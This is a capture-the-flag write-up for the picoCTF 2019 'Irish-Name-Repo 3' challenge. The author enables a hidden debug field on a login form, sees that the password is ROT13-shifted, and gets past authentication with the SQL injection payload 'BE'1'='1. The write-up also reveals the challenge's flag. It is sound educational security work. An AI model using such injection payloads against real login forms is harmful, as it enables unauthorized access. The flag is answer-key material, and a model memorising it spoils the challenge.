# Irish-Name-Repo 3 - Points: 400

## Problem
> There is a secure website running at https://2019shell1.picoctf.com/problem/32237/ ([link](https://2019shell1.picoctf.com/problem/32237/)) or http://2019shell1.picoctf.com:32237. Try to see if you can login as admin!

## Hints
> Seems like the password is encrypted.

## Overview

Just a normal login page. It seems like we have to do some injection exploits to break in the system.

## Solutions

I tried a basic SQL injection to the login form and a code 500 internal error is returned.

Let's inspect the code, specifically the login form.

```html
                    <form action="login.php" method="POST">
                        <fieldset>
                            <div class="form-group">
                                
                                <label for="password">Password:</label>
                                <div class="controls">
                                    <input type="password" id="password" name="password" class="form-control">
                                </div>
                            </div>
                            <input type="hidden" name="debug" value="0">

                            <div class="form-actions">
                                <input type="submit" value="Login" class="btn btn-primary">
                            </div>
                        </fieldset>
                    </form>
```

There's actually another parameter besides password which named debug and its value is set as 0 

Let's change it to 1 and submit the form once again using the same SQL injection technique.

The server returned:

```
password: 'OR'1'='1
SQL query: SELECT * FROM admin where password = ''BE'1'='1'
```

I typed ```OR``` in the password but the server read it as ```BE```, so there should be Caesar cipher encoding somewhere in the backend process. So I tried to use BE as the payload this time.

And it worked
```
password: 'BE'1'='1
SQL query: SELECT * FROM admin where password = ''OR'1'='1'
Logged in!
Your flag is: picoCTF{3v3n_m0r3_SQL_5c27c4ea}
```
